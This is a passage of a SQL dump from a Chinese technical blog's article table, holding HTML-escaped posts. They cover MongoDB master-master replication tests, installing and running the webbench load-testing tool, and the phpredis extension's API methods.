/&gt;&amp;gt; showcollections &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;system.indexes&lt;br /&gt;User&lt;br /&gt;&amp;gt; db.user.find();&lt;br /&gt;&amp;gt;&lt;br /&gt;从 服务器的test库中user表已经存在，同时我还查了一下user表为空&lt;br /&gt;现在我们再来测试一下，向主服务器test库的user表中插入一条数据&lt;br /&gt;&amp;gt; showcollections &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;system.indexes&lt;br /&gt;user&lt;br /&gt;&amp;gt;db.user.insert({uid:1,name:&amp;quot;Falcon.C&amp;quot;,age:25});&lt;br /&gt;&amp;gt;db.user.find(); &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;4b8226a997521a578b7aea38&lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;&amp;quot;), &amp;quot;uid&amp;quot; : 1, &amp;quot;name&amp;quot; :&amp;quot;Falcon.C&amp;quot;, &amp;quot;age&amp;quot; : 25 }&lt;br /&gt;&amp;gt;&lt;br /&gt;这 时我们查看从服务器的test库user表时会多出一条记录来：&lt;br /&gt;&amp;gt; db.user.find();&lt;br /&gt;{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;4b8226a997521a578b7aea38&lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;&amp;quot;), &amp;quot;uid&amp;quot; : 1, &amp;quot;name&amp;quot; :&amp;quot;Falcon.C&amp;quot;, &amp;quot;age&amp;quot; : 25 }&lt;br /&gt;&amp;gt;&lt;br /&gt;MongoDB 还有 Replica Pairs 和 Master - Master&lt;br /&gt;参考地址：&lt;/span&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;a href=&quot;http://www.mongodb.org/display/DOCS/Master+Slave&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;http://www.mongodb.org/display/DOCS/Master+Slave&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;MongoDB一般情况下都可以支持主主复制，但是在大部分情况下官方不推荐使用&lt;br /&gt;运行 的master - master的准备工作是：&lt;br /&gt;新建存放数据 库文件 的路径&lt;br /&gt;$mkdir mongodata/mm_28050 mongodata/mm_28051&lt;br /&gt;运行mongodb数据库 ，一个端口 为：28050，一个为：28051&lt;br /&gt;$ mongodb/bin/mongod --port 28050 --dbpath ~/mongodata/mm_28050--master --slave --source localhost:28051 &amp;gt;/dev/null &amp;amp;&lt;br /&gt;$ mongodb/bin/mongod --port 28051 --dbpath ~mongodata/mm_28051--master --slave --source localhost:28050 &amp;gt;/dev/null &amp;amp;&lt;br /&gt;可以通过ps -ef|grep mongod 或 netstat -an -t来检查是否运行功能&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;font-size:12px&quot;&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;测试master - master模式 ：&lt;br /&gt;$ mongodb/bin/mongo --port 28050&lt;br /&gt;MongoDB shell version: 1.2.4-&lt;br /&gt;url: test&lt;br /&gt;connecting to: 127.0.0.1:28050/test&lt;br /&gt;type &amp;quot;help&amp;quot; for help&lt;br /&gt;&amp;gt; show dbs&lt;br /&gt;admin&lt;br /&gt;local&lt;br /&gt;&amp;gt; db&lt;br /&gt;test&lt;br /&gt;&amp;gt;db.user.insert({_id:1,username:&amp;quot;Falcon.C&amp;quot;,age:25,sex:&amp;quot;M&amp;quot;});&lt;br /&gt;&amp;gt; db.user.find();&lt;br /&gt;{ &amp;quot;_id&amp;quot; : 1, &amp;quot;username&amp;quot; : &amp;quot;Falcon.C&amp;quot;, &amp;quot;age&amp;quot; : 25, &amp;quot;sex&amp;quot; : &amp;quot;M&amp;quot;}&lt;br /&gt;&amp;gt; db.user.find(); &lt;/span&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;//在28051端口插入数据后，再来查询，看数据是否同步&lt;br /&gt;{ &amp;quot;_id&amp;quot; : 1, &amp;quot;username&amp;quot; : &amp;quot;Falcon.C&amp;quot;, &amp;quot;age&amp;quot; : 25, &amp;quot;sex&amp;quot; : &amp;quot;M&amp;quot;}&lt;br /&gt;{ &amp;quot;_id&amp;quot; : 2, &amp;quot;username&amp;quot; : &amp;quot;NetOne&amp;quot;, &amp;quot;age&amp;quot; : 24, &amp;quot;sex&amp;quot; : &amp;quot;F&amp;quot; }&lt;br /&gt;&amp;gt;&lt;br /&gt;$ mongodb/bin/mongo --port 28051&lt;br /&gt;MongoDB shell version: 1.2.4-&lt;br /&gt;url: test&lt;br /&gt;connecting to: 127.0.0.1:28051/test&lt;br /&gt;type &amp;quot;help&amp;quot; for help&lt;br /&gt;&amp;gt; db&lt;br /&gt;test&lt;br /&gt;&amp;gt; showcollections &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;端口28050已经新建了一个user表并插入了一条数据，这里多出2表&lt;br /&gt;system.indexes&lt;br /&gt;user&lt;br /&gt;&amp;gt;db.user.find(); &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;//查询表user发现数据已经同步&lt;br /&gt;{ &amp;quot;_id&amp;quot; : 1, &amp;quot;username&amp;quot; : &amp;quot;Falcon.C&amp;quot;, &amp;quot;age&amp;quot; : 25, &amp;quot;sex&amp;quot; : &amp;quot;M&amp;quot;}&lt;br /&gt;&amp;gt;db.user.insert({_id:2,username:&amp;quot;NetOne&amp;quot;,age:24,sex:&amp;quot;F&amp;quot;});在此插入数据看数据是否双向同步&lt;br /&gt;&amp;gt;db.user.find(); &lt;/span&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;br /&gt;&lt;span style=&quot;font-size:14px;font-family:微软雅黑,microsoft yahei;&quot;&gt;{ &amp;quot;_id&amp;quot; : 1, &amp;quot;username&amp;quot; : &amp;quot;Falcon.C&amp;quot;, &amp;quot;age&amp;quot; : 25, &amp;quot;sex&amp;quot; : &amp;quot;M&amp;quot;}&lt;br /&gt;{ &amp;quot;_id&amp;quot; : 2, &amp;quot;username&amp;quot; : &amp;quot;NetOne&amp;quot;, &amp;quot;age&amp;quot; : 24, &amp;quot;sex&amp;quot; : &amp;quot;F&amp;quot; }&lt;br /&gt;&amp;gt;&lt;br /&gt;通过以上开启两终端分别连接到28050、28051端口，分别插入测试数据发现，一切正常，正如我们所想的那样实现数据的双向同步&lt;/span&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386776248);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(42, 42, '&lt;p&gt;webbench：网站压力测试工具，最多可以模拟3W个并发连接去测试网站的负载能力&lt;/p&gt;&lt;p&gt;下载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.s135.com/soft/linux/webbench/webbench-1.5.tar.gz&quot;&gt;http://blog.s135.com/soft/linux/webbench/webbench-1.5.tar.gz&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;编译安装：&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#wget http://blog.s135.com/soft/linux/webbench/webbench-1.5.tar.gz \r\n#tar zxvf webbench-1.5.tar.gz \r\n#cd webbench-1.5 \r\n#make &amp;amp;&amp;amp; make install&lt;/pre&gt;&lt;p&gt;参数介绍：&lt;/p&gt;&lt;p&gt;-f | --force &amp;nbsp; &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Don&amp;#39;t wait for reply from server &amp;nbsp; 不必等服务器返回数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-r | --reload &amp;nbsp; &lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Send reload request - Pragma: no-cache &amp;nbsp; 发送重载请求 - 杂注：无缓存&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-t|--time &amp;lt;sec&amp;gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Run benchmark for &amp;lt;sec&amp;gt; seconds. Default 30 &amp;nbsp; benchmark运行时间，默认时间30秒&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-p|--proxy &amp;lt;server:port&amp;gt; &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Use proxy server for request &amp;nbsp; 用代理服务器发送请求&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-c|--clients &amp;lt;n&amp;gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Run &amp;lt;n&amp;gt; HTTP clients at once. Default one &amp;nbsp; 每次请求的并发客户端数 默认为1&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-9|--http09 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Use HTTP/0.9 style requests &amp;nbsp; 使用HTTP/0.9协议请求&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-1|--http10 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Use HTTP/1.0 protocol &amp;nbsp; 使用HTTP/1.0协议&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-2|--http11 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Use HTTP/1.1 protocol &amp;nbsp; 使用HTTP/1.1协议&lt;/span&gt;&lt;/p&gt;&lt;p&gt;--get &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Use GET request method &amp;nbsp; 使用GET请求方法&lt;/span&gt;&lt;/p&gt;&lt;p&gt;--head &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Use HEAD request method &amp;nbsp; 使用HEAD请求方法&lt;/span&gt;&lt;/p&gt;&lt;p&gt;--options &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Use OPTIONS request method &amp;nbsp; 使用OPTIONS请求方法&lt;/span&gt;&lt;/p&gt;&lt;p&gt;--trace &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Use TRACE request method &amp;nbsp; 使用TRACE请求方法&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-?|-h|--help &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;This information &amp;nbsp; 获取帮助信息&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-V|--version &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;Display program version &amp;nbsp; 显示程序版本信息&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;例子：&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#webbench -c 1000 -t 10 http://www.google.com/ \r\nWebbench - Simple Web Benchmark 1.5 \r\nCopyright (c) Radim Kolar 1997-2004, GPL Open Source Software. \r\n         \r\nBenchmarking: GET http://www.google.com/ \r\n1000 clients, running 10 sec. \r\n         \r\nSpeed=9954 pages/min, 94340 bytes/sec. \r\nRequests: 1659 susceed, 0 failed.&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;用GET方式向google发送请求，模拟1000个并发客户端，请求执行时间10秒钟&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;返回结果分析：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;10秒钟共有1659次请求成功&lt;br /&gt;&lt;/p&gt;&lt;p&gt;google响应速度，9954页面/分钟，94340字节/秒&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386776475),
(43, 43, '&lt;p&gt;phpredis是php的一个扩展，效率是相当高有链表排序功能，对创建内存级的模块业务关系&lt;/p&gt;&lt;p&gt;很有用;以下是redis官方提供的命令使用技巧:&lt;/p&gt;&lt;p&gt;下载地址如下：&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/nicolasff/phpredis/downloads&quot;&gt;https://github.com/nicolasff/phpredis/downloads&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;安装&lt;/span&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#tar zvxf nicolasff-phpredis-2.2.1-27-gf8f552e.tar.gz   \r\n#cd nicolasff-phpredis-2.2.1-27-gf8f552e   \r\n#phpize   \r\n#./configure --with-php-config=/usr/local/php/bin/php-config   \r\n#make   \r\n#make install&lt;/pre&gt;&lt;p&gt;安装完成之后编辑php.ini文件，加入生成的redis.so扩展，重启php-fpm&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;Redis::__construct&lt;/span&gt;构造函数&lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;$redis = new Redis();&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;connect, open&lt;/span&gt; 链接redis服务&lt;br /&gt;&lt;span style=&quot;font-style:italic&quot;&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;参数&lt;/span&gt;&lt;/span&gt;&lt;em&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;/span&gt;host&lt;/em&gt;: string，服务地址&lt;em&gt;&lt;br /&gt;port&lt;/em&gt;: int,端口号&lt;em&gt;&lt;br /&gt;timeout&lt;/em&gt;: float,链接时长 (可选, 默认为 0 ，不限链接时间)&lt;br /&gt;注: 在redis.conf中也有时间，默认为300&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;pconnect, popen&lt;/span&gt; 不会主动关闭的链接&lt;br /&gt;参考上面&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;setOption&lt;/span&gt; 设置redis模式&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;getOption&lt;/span&gt; 查看redis设置的模式&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;ping&lt;/span&gt; 查看连接状态&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;get&lt;/span&gt; 得到某个key的值（string值）&lt;br /&gt;如果该key不存在，return &lt;span style=&quot;font-weight:bold&quot;&gt;false&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;set&lt;/span&gt; 写入key 和 value（string值）&lt;br /&gt;如果写入成功，return &lt;span style=&quot;font-weight:bold&quot;&gt;ture&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;setex&lt;/span&gt; 带生存时间的写入值&lt;br /&gt;$redis-&amp;gt;setex(&amp;#39;key&amp;#39;, 3600, &amp;#39;value&amp;#39;); // sets key &rarr; value, with 1h TTL.&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;setnx&lt;/span&gt; 判断是否重复的，写入值&lt;br /&gt;$redis-&amp;gt;setnx(&amp;#39;key&amp;#39;, &amp;#39;value&amp;#39;);&lt;br /&gt;$redis-&amp;gt;setnx(&amp;#39;key&amp;#39;, &amp;#39;value&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;delete&lt;/span&gt; &amp;nbsp;删除指定key的值&lt;br /&gt;返回已经删除key的个数（长整数）&lt;br /&gt;$redis-&amp;gt;delete(&amp;#39;key1&amp;#39;, &amp;#39;key2&amp;#39;);&lt;br /&gt;$redis-&amp;gt;delete(array(&amp;#39;key3&amp;#39;, &amp;#39;key4&amp;#39;, &amp;#39;key5&amp;#39;));&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;ttl&lt;/span&gt;&lt;br /&gt;得到一个key的生存时间&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;persist&lt;/span&gt;&lt;br /&gt;移除生存时间到期的key&lt;br /&gt;如果key到期 true 如果不到期 false&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;mset&lt;/span&gt; （redis版本1.1以上才可以用）&lt;br /&gt;同时给多个key赋值&lt;br /&gt;$redis-&amp;gt;mset(array(&amp;#39;key0&amp;#39; =&amp;gt; &amp;#39;value0&amp;#39;, &amp;#39;key1&amp;#39; =&amp;gt; &amp;#39;value1&amp;#39;));&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;multi, exec, discard&lt;/span&gt;&lt;br /&gt;进入或者退出事务模式&lt;br /&gt;参数可选Redis::MULTI&lt;span style=&quot;font-family:monospace&quot;&gt;或&lt;/span&gt;Redis::PIPELINE. 默认是 Redis::MULTI&lt;br /&gt;Redis::MULTI：将多个操作当成一个事务执行&lt;br /&gt;Redis::PIPELINE:让（多条）执行命令简单的，更加快速的发送给服务器，但是没有任何原子性的保证&lt;br /&gt;discard:删除一个事务&lt;br /&gt;返回值&lt;br /&gt;multi()，返回一个redis对象，并进入multi-mode模式，一旦进入multi-mode模式，以后调用的所有方法都会返回相同的对象，只到exec(）方法被调用。&lt;br /&gt;&lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;watch, unwatch&lt;/span&gt; （代码测试后，不能达到所说的效果）&lt;br /&gt;监测一个key的值是否被其它的程序更改。如果这个key在watch 和 exec （方法）间被修改，这个 MULTI/EXEC 事务的执行将失败（return false）&lt;br /&gt;unwatch &amp;nbsp;取消被这个程序监测的所有key&lt;br /&gt;参数，一对key的列表&lt;br /&gt;$redis-&amp;gt;watch(&amp;#39;x&amp;#39;);&lt;br /&gt;&lt;br /&gt;$ret = $redis-&amp;gt;multi() -&amp;gt;incr(&amp;#39;x&amp;#39;) -&amp;gt;exec();&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;subscribe&lt;/span&gt; *&lt;br /&gt;方法回调。注意，该方法可能在未来里发生改变&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;publish&lt;/span&gt; *&lt;br /&gt;发表内容到某一个通道。注意，该方法可能在未来里发生改变&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;exists&lt;/span&gt;&lt;br /&gt;判断key是否存在。存在 true 不在 false&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;incr, incrBy&lt;/span&gt;&lt;br /&gt;key中的值进行自增1，如果填写了第二个参数，者自增第二个参数所填的值&lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;incr(&amp;#39;key1&amp;#39;);&lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;incrBy(&amp;#39;key1&amp;#39;, 10);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;decr, decrBy&lt;/span&gt;&lt;br /&gt;做减法，使用方法同incr&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;getMultiple&lt;/span&gt;&lt;br /&gt;传参&lt;br /&gt;由key组成的数组&lt;br /&gt;返回参数&lt;br /&gt;如果key存在返回value，不存在返回false&lt;br /&gt;$redis-&amp;gt;set(&amp;#39;key1&amp;#39;, &amp;#39;value1&amp;#39;); $redis-&amp;gt;set(&amp;#39;key2&amp;#39;, &amp;#39;value2&amp;#39;); $redis-&amp;gt;set(&amp;#39;key3&amp;#39;, &amp;#39;value3&amp;#39;); $redis-&amp;gt;getMultiple(array(&amp;#39;key1&amp;#39;, &amp;#39;key2&amp;#39;, &amp;#39;key3&amp;#39;));&lt;br /&gt;$redis-&amp;gt;lRem(&amp;#39;key1&amp;#39;, &amp;#39;A&amp;#39;, 2);&lt;br /&gt;$redis-&amp;gt;lRange(&amp;#39;key1&amp;#39;, 0, -1);&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;list&lt;/span&gt;相关操作&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lPush&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;lPush(key, value);&lt;br /&gt;在名称为key的list左边（头）添加一个值为value的元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;rPush&lt;/span&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;rPush(key, value);&lt;br /&gt;在名称为key的list右边（尾）添加一个值为value的元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lPushx/&lt;/span&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;rPushx&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;lPushx(key, value);&lt;br /&gt;在名称为key的list左边(头)/右边（尾）添加一个值为value的元素,如果value已经存在，则不添加&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lPop&lt;/span&gt;/&lt;span style=&quot;font-weight:bold&quot;&gt;rPop&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;lPop(&amp;#39;key&amp;#39;);&lt;br /&gt;输出名称为key的list左(头)起/右（尾）起的第一个元素，删除该元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;blPop/brPop&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;blPop(&amp;#39;key1&amp;#39;, &amp;#39;key2&amp;#39;, 10);&lt;br /&gt;lpop命令的block版本。即当timeout为0时，若遇到名称为key &lt;strong&gt;&lt;em&gt;&lt;span style=&quot;font-size:10px&quot;&gt;i&lt;/span&gt;&lt;/em&gt;&lt;/strong&gt;的list不存在或该list为空，则命令结束。如果timeout&amp;gt;0，则遇到上述情况时，等待timeout秒，如果问题没有解决，则对key&lt;strong&gt;&lt;em&gt;&lt;span style=&quot;font-size:10px&quot;&gt;i+1&lt;/span&gt;&lt;/em&gt;&lt;/strong&gt;开始的list执行pop操作&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;br /&gt;lSize&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;lSize(&amp;#39;key&amp;#39;);&lt;br /&gt;返回名称为key的list有多少个元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lIndex, lGet&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;lGet(&amp;#39;key&amp;#39;, 0);&lt;br /&gt;返回名称为key的list中index位置的元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lSet&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;lSet(&amp;#39;key&amp;#39;, 0, &amp;#39;X&amp;#39;);&lt;br /&gt;给名称为key的list中index位置的元素赋值为value&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lRange, lGetRange&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;lRange(&amp;#39;key1&amp;#39;, 0, -1);&lt;br /&gt;返回名称为key的list中start至end之间的元素（end为 -1 ，返回所有）&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lTrim, listTrim&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;lTrim(&amp;#39;key&amp;#39;, start, end);&lt;br /&gt;截取名称为key的list，保留start至end之间的元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lRem, lRemove&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;lRem(&amp;#39;key&amp;#39;, &amp;#39;A&amp;#39;, 2);&lt;br 